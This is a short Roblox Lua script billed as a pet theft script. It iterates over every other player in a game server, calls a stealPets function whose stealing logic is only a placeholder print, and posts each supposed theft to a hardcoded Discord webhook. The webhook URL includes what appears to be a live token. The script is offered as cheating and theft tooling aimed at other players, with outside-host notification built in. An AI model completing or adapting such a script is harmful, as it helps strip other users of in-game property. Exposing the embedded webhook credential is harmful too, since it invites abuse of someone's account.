-- Roblox Pet Theft Script with Discord Notification

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Discord Webhook URL
local webhookUrl = "https://discord.com/api/webhooks/1401056291069362196/X6C1KBefDrMjVvX7yI5dMTEqc94zxQJcC_7tEq-0I1PmsbwGm9DwingWy-CmtsHNGf9v"

-- Function to send notification to Discord
local function sendDiscordNotification(message)
    local data = {
        ["content"] = message
    }
    local jsonData = HttpService:JSONEncode(data)
    
    -- Sending the notification
    local response = HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
    print("Notification sent: " .. response)
end

-- Function to steal pets from another player
local function stealPets(targetPlayer)
    if targetPlayer and targetPlayer.Character then
        -- Logic to steal pets (this is a placeholder)
        print("Stealing pets from " .. targetPlayer.Name)
        
        -- Notify Discord
        sendDiscordNotification(player.Name .. " has stolen pets from " .. targetPlayer.Name)
    else
        print("Target player not found or has no character.")
    end
end

-- Main execution
for _, target in pairs(Players:GetPlayers()) do
    if target ~= player then
        stealPets(target)
    end
end
